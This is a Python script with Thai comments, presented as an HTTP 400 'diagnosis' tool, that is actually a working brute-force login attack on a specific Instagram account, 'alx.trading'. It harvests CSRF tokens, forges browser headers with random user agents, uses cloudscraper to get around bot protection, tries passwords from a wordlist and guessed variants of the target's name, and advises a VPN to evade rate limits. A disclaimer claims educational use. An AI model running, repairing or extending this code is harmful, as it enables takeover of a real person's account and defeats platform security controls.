#!/usr/bin/env python3
"""
HTTP 400 Error Diagnosis & Fix Tool for Instagram Brute Force
เครื่องมือวินิจฉัยและแก้ไข HTTP 400 Error สำหรับการโจมตี Instagram

🎯 Target: alx.trading
🔧 ลักษณะการแก้ไข HTTP 400:
   - Payload format ใหม่ตาม Instagram API 2025
   - Headers ครบถ้วนและถูกต้อง
   - CSRF token management ที่ดีขึ้น
   - Request debugging และ validation

พัฒนาเพื่อการศึกษาและการทดสอบความปลอดภัยเท่านั้น
"""

import requests
import time
import random
import json
import re
import os

# ติดตั้ง modules ที่จำเป็น
try:
    import cloudscraper
    from fake_useragent import UserAgent
except ImportError:
    print("🔧 กำลังติดตั้ง required packages...")
    os.system("pip install cloudscraper fake-useragent")
    import cloudscraper
    from fake_useragent import UserAgent


class InstagramHTTP400Fixer:
    """เครื่องมือแก้ไขปัญหา HTTP 400 Error สำหรับ Instagram"""

    def __init__(self, target_username):
        self.target_username = target_username
        self.attempts = 0
        self.http_400_count = 0

        # สร้าง session
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper()

        print(f"🎯 Target: {target_username}")
        print("🔧 HTTP 400 Fixer initialized")

    def get_csrf_token(self):
        """ดึง CSRF token จาก Instagram"""
        try:
            print("🔐 Getting CSRF token...")

            response = self.scraper.get(
                'https://www.instagram.com/accounts/login/',
                timeout=15
            )

            if response.status_code != 200:
                print(f"❌ Cannot access login page: {response.status_code}")
                return None

            # ดึง CSRF token จาก cookies
            csrf_token = None
            for cookie in self.scraper.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break

            if csrf_token:
                print(f"✅ CSRF token: {csrf_token[:10]}...")
                return csrf_token
            else:
                print("❌ CSRF token not found")
                return None

        except Exception as e:
            print(f"❌ CSRF token error: {e}")
            return None

    def create_fixed_payload(self, password, csrf_token):
        """สร้าง payload ที่แก้ไขแล้วสำหรับ Instagram API 2025"""
        timestamp = int(time.time())

        # Instagram encrypted password format
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"

        payload = {
            'username': self.target_username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',
        }

        return payload

    def create_fixed_headers(self, csrf_token):
        """สร้าง headers ที่ครบถ้วนสำหรับ Instagram API"""
        headers = {
            'User-Agent': self.ua.random,
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Origin': 'https://www.instagram.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        return headers

    def test_login_request(self, password):
        """ทดสอบ login request เพื่อวินิจฉัย HTTP 400"""
        self.attempts += 1
        print(f"\n🔍 Test #{self.attempts}: {password}")

        # ดึง CSRF token
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False, "No CSRF token"

        # สร้าง payload และ headers
        payload = self.create_fixed_payload(password, csrf_token)
        headers = self.create_fixed_headers(csrf_token)

        try:
            # ส่ง request
            response = self.scraper.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=payload,
                headers=headers,
                timeout=20
            )

            print(f"📊 Status Code: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('authenticated'):
                        print(f"🎉 SUCCESS! Password found: {password}")
                        return True, "Login successful"
                    else:
                        message = result.get('message', 'Wrong password')
                        print(f"❌ Failed: {message}")
                        return False, message
                except json.JSONDecodeError:
                    print(f"⚠️ Non-JSON response")
                    return False, "Invalid JSON"

            elif response.status_code == 400:
                self.http_400_count += 1
                print(f"⚠️ HTTP 400 Bad Request #{self.http_400_count}")

                # แสดง response details สำหรับ debugging
                print(f"📄 Response headers: {dict(response.headers)}")

                try:
                    error_data = response.json()
                    print(f"📋 Error response: {error_data}")
                except:
                    print(f"📄 Response text: {response.text[:200]}...")

                return False, "HTTP 400 Bad Request"

            elif response.status_code == 429:
                print(f"🚨 Rate limited")
                return False, "Rate limited"

            else:
                print(f"⚠️ HTTP {response.status_code}")
                return False, f"HTTP {response.status_code}"

        except Exception as e:
            print(f"❌ Request error: {e}")
            return False, str(e)

    def run_http400_diagnosis(self, test_passwords):
        """รันการวินิจฉัย HTTP 400 Error"""
        print(f"\n🧪 Starting HTTP 400 diagnosis for {self.target_username}")
        print(f"📋 Testing with {len(test_passwords)} passwords")
        print("=" * 60)

        results = {
            'total_tests': 0,
            'http_200': 0,
            'http_400': 0,
            'http_429': 0,
            'other_errors': 0,
            'success': False,
            'found_password': None
        }

        for password in test_passwords:
            success, message = self.test_login_request(password)

            results['total_tests'] += 1

            if success:
                results['success'] = True
                results['found_password'] = password
                break
            elif 'HTTP 400' in message:
                results['http_400'] += 1
            elif 'Rate limited' in message:
                results['http_429'] += 1
            elif message in ['Wrong password', 'Invalid JSON']:
                results['http_200'] += 1
            else:
                results['other_errors'] += 1

            # หยุดถ้า HTTP 400 มากเกินไป
            if self.http_400_count >= 3:
                print(f"\n⚠️ Too many HTTP 400 errors ({self.http_400_count})")
                print("🔄 Stopping diagnosis")
                break

            # รอระหว่างการทดสอบ
            time.sleep(random.uniform(2, 5))

        return results

    def print_diagnosis_summary(self, results):
        """แสดงสรุปผลการวินิจฉัย"""
        print(f"\n" + "=" * 60)
        print(f"📊 HTTP 400 DIAGNOSIS SUMMARY")
        print(f"=" * 60)

        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Total tests: {results['total_tests']}")
        print(f"✅ HTTP 200 (Normal): {results['http_200']}")
        print(f"⚠️ HTTP 400 (Bad Request): {results['http_400']}")
        print(f"🚨 HTTP 429 (Rate Limited): {results['http_429']}")
        print(f"❌ Other errors: {results['other_errors']}")

        if results['success']:
            print(f"\n🎉 PASSWORD FOUND: {results['found_password']}")

        # วิเคราะห์ผล
        print(f"\n🔍 ANALYSIS:")

        if results['http_400'] == 0:
            print(f"✅ No HTTP 400 errors - payload format is correct!")
        elif results['http_400'] > 0:
            print(f"⚠️ {results['http_400']} HTTP 400 errors detected")
            print(f"💡 Possible causes:")
            print(f"   - Instagram API format changed")
            print(f"   - Missing required parameters")
            print(f"   - CSRF token issues")
            print(f"   - Headers validation failed")

        if results['http_429'] > 0:
            print(f"🚨 Rate limiting detected")
            print(f"💡 Recommendation: Use VPN or wait longer")

        print(f"\n🎯 NEXT STEPS:")
        if results['http_400'] == 0:
            print(f"   ✅ Continue with full password list")
        else:
            print(f"   🔧 Fix payload format based on error details")
            print(f"   🔄 Use browser automation instead")
            print(f"   📚 Check latest Instagram API documentation")


def load_test_passwords():
    """โหลดรหัสผ่านสำหรับทดสอบ"""
    # ลองโหลดจากไฟล์หลัก
    password_file = "/workspaces/sugarglitch-realops/passwords.txt"

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        # ใช้แค่ 10 รหัสผ่านแรกสำหรับทดสอบ
        return passwords[:10]

    except FileNotFoundError:
        print(f"⚠️ Password file not found, using default test passwords")
        # รหัสผ่านทดสอบ
        return [
            'AlexInstagram2025',  # รหัสผ่านที่เกิด HTTP 400
            'alex123',
            'trading123',
            'alx2025',
            'instagram123'
        ]


def main():
    """ฟังก์ชั่นหลักสำหรับวินิจฉัย HTTP 400"""
    print("🔧 Instagram HTTP 400 Error Diagnosis Tool")
    print("=" * 50)

    target_username = "alx.trading"
    test_passwords = load_test_passwords()

    print(f"🎯 Target: {target_username}")
    print(f"🧪 Test passwords: {len(test_passwords)}")

    for i, pwd in enumerate(test_passwords, 1):
        print(f"   {i}. {pwd}")

    # ยืนยัน
    confirm = input(f"\n🔍 Start HTTP 400 diagnosis? (y/N): ")
    if confirm.lower() != 'y':
        print("❌ Cancelled")
        return

    # เริ่มการวินิจฉัย
    fixer = InstagramHTTP400Fixer(target_username)
    results = fixer.run_http400_diagnosis(test_passwords)
    fixer.print_diagnosis_summary(results)


if __name__ == "__main__":
    main()
